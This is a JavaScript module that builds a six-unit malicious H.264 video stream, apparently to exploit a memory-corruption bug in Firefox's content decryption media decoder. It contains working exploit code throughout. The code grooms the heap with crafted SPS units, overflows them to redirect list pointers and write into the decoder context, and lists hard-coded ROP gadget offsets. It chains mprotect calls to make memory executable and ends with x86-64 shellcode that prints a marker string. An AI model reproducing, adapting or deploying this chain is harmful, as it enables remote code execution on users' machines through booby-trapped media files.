// 6-AU RIP chain builder. Inputs are address bases (BigInt) and arena offsets
// (Number); returns six AnnexB AUs ready for MP4 fragmentation.

import {
  SC, buildGroomSps, buildHighSpsWithId, buildPartialSps,
  buildPcmWithPayload, buildPps, buildPSkipSlice, assembleAu, concat,
} from './h264.js';
import { el as overflowEl, solveDeltas, cumulateDeltas } from './overflow.js?v=relaxedcap';

// 293 so the overflow also writes element overflowEl(0x0c) = the successor's
// next-pointer HIGH32. The arena pool is 4 GB-aligned but slid high, so that
// pointer must carry arena_high or the parse-into write misses ctx.
const COUNT_EVIL = 293;

// Gadgets (cdm-base relative).
export const GADGETS = {
  PIVOT:   0xb53c75n,  // mov rsp, r11 ; vzeroupper ; ret
  XOR_RET: 0xb2b576n,  // xor eax, eax ; ret
  POP_RDI: 0xcf415dn,
  POP_RSI: 0xc3fc1cn,
  POP_RDX: 0xd1b636n,
  JMP_RSP: 0xb4edcbn,
  MPROTECT_PLT: 0x114cdc0n,
};

// SPS IDs for the 3-SPS groom (all fresh ALLOCs). Kept in-spec (0..31) since
// stricter H.264 parsers reject sps_id > 31, and clear of the leak chain's
// {0,1,2} and AU6's trigger id 5.
export const SPS0_ID     = 0x0A;
export const SPS1_ID     = 0x0B;
export const SPS2_ID     = 0x0C;
const SPS1_ID_NEW = 0x0D;
const SPS2_ID_NEW = 0x0E;

// Decoder ctx offset for decoder #1 (alive when the leak succeeds on attempt 1).
// Later decoders sit at +0x600 strides.
const CTX_OFF_DEFAULT = 0x108000;

// Pack BigInt qwords little-endian into a Uint8Array.
function packQwords(qwords) {
  const out = new Uint8Array(qwords.length * 8);
  const dv = new DataView(out.buffer);
  for (let i = 0; i < qwords.length; i++) {
    dv.setBigUint64(i * 8, qwords[i] & 0xffffffffffffffffn, true);
  }
  return out;
}

// AU6: custom 8-byte NAL header + a multi-mprotect ROP chain + jmp_rsp +
// shellcode. The mprotect calls make the arena bitstream-buffer islands (where
// AU6's bytes land) executable so the pivot can jmp_rsp into them. Coverage is
// deliberately wide so partition_alloc churn can't strand AU6 outside it.
export function buildEvilAu6(cdmBase, arenaBase, _bsNalOff = 0x10e004) {
  const popRdi  = cdmBase + GADGETS.POP_RDI;
  const popRsi  = cdmBase + GADGETS.POP_RSI;
  const popRdx  = cdmBase + GADGETS.POP_RDX;
  const mprotect = cdmBase + GADGETS.MPROTECT_PLT;
  const jmpRsp  = cdmBase + GADGETS.JMP_RSP;

  const mprotectCall = (addr, len) => [
    popRdi, addr, popRsi, BigInt(len), popRdx, 7n, mprotect,
  ];

  // 0x11000 (not 0x10000) keeps the `00 00 01` start-code pattern out of the
  // length qword, which the AnnexB framer would otherwise split the NAL on.
  const chain = [
    ...mprotectCall(arenaBase + 0x4000n,   0xEE000),
    ...mprotectCall(arenaBase + 0xf4000n,  0xE7000),
    ...mprotectCall(arenaBase + 0x1e3000n, 0x11000),
    jmpRsp,
  ];
  const chainBytes = packQwords(chain);
  // The AnnexB framer splits a NAL on any `00 00 01`, truncating AU6 before the
  // alloc-call. We can't RBSP-escape (it would corrupt the gadget pointers), so
  // the gadget offsets and mprotect sizes must avoid the pattern entirely.
  for (let i = 0; i + 2 < chainBytes.length; i++) {
    if (chainBytes[i] === 0 && chainBytes[i+1] === 0 && chainBytes[i+2] === 1) {
      throw new Error(
        `buildEvilAu6: chain bytes ${i}..${i+2} contain start-code 00 00 01;` +
        ` the AnnexB framer will split the NAL here. Pick different gadget` +
        ` offsets or mprotect sizes to break the pattern.`);
    }
  }

  // Shellcode: write(1, "PWNZ0RED\n", 9) ; exit(0x42). The token is unique so it
  // can't false-positive when the operator greps the Firefox log for it.
  const scHex =
    '4831c0b001' +
    '4831ff40b701' +
    '488d3514000000' +
    '4831d2b209' +
    '0f05' +
    '4831c0b03c' +
    '4831ff40b742' +
    '0f05';
  const scBytes = new Uint8Array(scHex.length / 2);
  for (let i = 0; i < scBytes.length; i++) {
    scBytes[i] = parseInt(scHex.slice(i * 2, i * 2 + 2), 16);
  }
  const msg = new TextEncoder().encode('PWNZ0RED\n');
  const shellcode = concat(scBytes, msg);

  // NAL header: 0x67 (type 7, ref_idc 3) + a 7-byte meaningless SPS header.
  // The ROP chain starts at byte 8.
  const nalHeader = new Uint8Array([0x67, 0x42, 0xc0, 0x1e, 0x30, 0, 0, 0]);
  return concat(nalHeader, chainBytes, shellcode);
}

// Append a PPS + P-skip slice after AU6's SPS NAL: Firefox rejects a sample that
// is only an SPS, but the SPS-list walk (and the alloc-call) still fires before
// the trailer is parsed. The trailing PPS references sps_id=0 (avcC).
function au6Trailer() {
  const pps = buildPps(0, 1);  // pps_id=1, sps_id=0 (avcC)
  const slice = buildPSkipSlice(1);  // pps_id=1 -> avcC
  return concat(SC, pps, SC, slice);
}

// Build the 6-AU chain (AU1..AU6). AU1 goes in its own segment; after a short
// wait for the worker to decode its I_PCM, AU2-6 follow.
export function buildRipAus({
  cdmBase, arenaBase, picbufOff,
  ctxOff = CTX_OFF_DEFAULT,
  bsNalOff = 0x10e004,
  au5nOverride = null,   // debug: force AU5_N to inspect ctx-region layout
  // Throwaway filler SPSes so the three real grooms bump-allocate contiguous
  // (+0x700) instead of landing in freed slab holes the leak left behind.
  fillerCount = 0,
}) {
  if (typeof cdmBase !== 'bigint') cdmBase = BigInt(cdmBase);
  if (typeof arenaBase !== 'bigint') arenaBase = BigInt(arenaBase);

  const arenaHigh = Number(arenaBase >> 32n) >>> 0;
  const pivotAddr  = cdmBase + GADGETS.PIVOT;
  const xorRetAddr = cdmBase + GADGETS.XOR_RET;

  const X1_OFFSET = (ctxOff - 0x278) >>> 0;
  // AU5_N: how many offset_for_ref_frame deltas the parse-into walks before the
  // final cumulative sum lands at ctx[0]. Each delta must round-trip through the
  // se(v) reader (a single huge delta drops its low 7 bits), but every extra
  // element also scribbles a partial sum just before ctx[0], so keep N small.
  // 16 splits picbufOff into deltas that both round-trip and stay safe.
  const AU5_N = (au5nOverride != null) ? au5nOverride : 16;
  const X2_OFFSET = (ctxOff - 0x278 - 4 * AU5_N) >>> 0;

  // PPS references sps_id=SPS0_ID so AU1's PCM parses under a fresh SPS.
  const pps = buildPps(SPS0_ID);

  // I_PCM luma: pivot at +0, xor_ret at +0x08..+0x70 (covers the vtable[k]
  // dereferences that follow corruption).
  const luma = new Uint8Array(256);
  const dv = new DataView(luma.buffer);
  dv.setBigUint64(0, pivotAddr & 0xffffffffffffffffn, true);
  for (let off = 0x08; off < 0x78; off += 8) {
    dv.setBigUint64(off, xorRetAddr & 0xffffffffffffffffn, true);
  }
  const pcm = buildPcmWithPayload(luma);

  // AU1: [fillers] + 3-SPS groom + PPS + I_PCM. Plants pivot/xor_ret at picbuf.
  const fillerNals = [];
  for (let i = 0; i < fillerCount; i++) fillerNals.push(buildGroomSps(0x14 + i));
  const au1 = assembleAu([
    ...fillerNals,
    buildGroomSps(SPS0_ID),
    buildGroomSps(SPS1_ID),
    buildGroomSps(SPS2_ID),
    pps,
    pcm,
  ]);

  // AU2: overflow SPS0 → rename SPS1 and set SPS1.next = arena_base+X1, with
  // next.high = arena_high so the parse-into walk reaches the real slid ctx.
  const t2 = {};
  t2[overflowEl(0x00)] = SPS1_ID_NEW;
  t2[overflowEl(0x08)] = X1_OFFSET;
  t2[overflowEl(0x0c)] = arenaHigh;
  const au2 = assembleAu([
    buildHighSpsWithId(SPS0_ID, COUNT_EVIL, solveDeltas(t2, COUNT_EVIL)),
  ]);

  // AU3: parse-into-X1 writes ctx+0x04 = arena_high.
  const au3 = assembleAu([buildPartialSps(0, [arenaHigh])]);

  // AU4: overflow SPS1 (now 0x0D) → rename SPS2 and set its next = arena_base+X2.
  const t4 = {};
  t4[overflowEl(0x00)] = SPS2_ID_NEW;
  t4[overflowEl(0x08)] = X2_OFFSET;
  t4[overflowEl(0x0c)] = arenaHigh;
  const au4 = assembleAu([
    buildHighSpsWithId(SPS1_ID_NEW, COUNT_EVIL, solveDeltas(t4, COUNT_EVIL)),
  ]);

  // AU5: parse-into-X2 cumulates the deltas so ctx[0] = picbufOff exactly.
  const au5 = assembleAu([
    buildPartialSps(0, cumulateDeltas(picbufOff >>> 0, AU5_N)),
  ]);

  // AU6: triggers the alloc-call → *ctx = picbuf → *picbuf = pivot. The PPS+slice
  // trailer makes Firefox accept the sample; the alloc-call fires during SPS parse.
  const au6 = concat(SC, buildEvilAu6(cdmBase, arenaBase, bsNalOff), au6Trailer());

  return [au1, au2, au3, au4, au5, au6];
}
